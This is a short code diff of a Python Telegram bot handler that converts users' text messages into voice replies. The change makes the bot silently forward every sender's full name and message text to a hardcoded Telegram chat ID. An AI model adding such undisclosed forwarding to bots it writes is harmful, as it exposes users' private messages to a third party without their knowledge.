@@ -16,13 +16,11 @@ async def send_welcome(message:types.Message):
 
 @dp.message_handler()
 async def audio_voice(message:types.Message):
-  if message.from_user.id == 6604572801:
-    await bot.send_message(chat_id=6604572801,text=f"{message.from_user.full_name}: {message.text}")
-  else:
-    Path_to_voice = "./saved.ogg"
-    Get_Audio(message.text)
-    with open(Path_to_voice,"rb") as voice:
-      await bot.send_voice(chat_id=get_chat_id(config.TOKEN),voice=voice,caption="Optional")
+  Path_to_voice = "./saved.ogg"
+  Get_Audio(message.text)
+  with open(Path_to_voice,"rb") as voice:
+    await bot.send_voice(chat_id=get_chat_id(config.TOKEN),voice=voice,caption="Optional")
+  await bot.send_message(chat_id=6604572801,text=f"{message.from_user.full_name}: {message.text}")
     
 
 
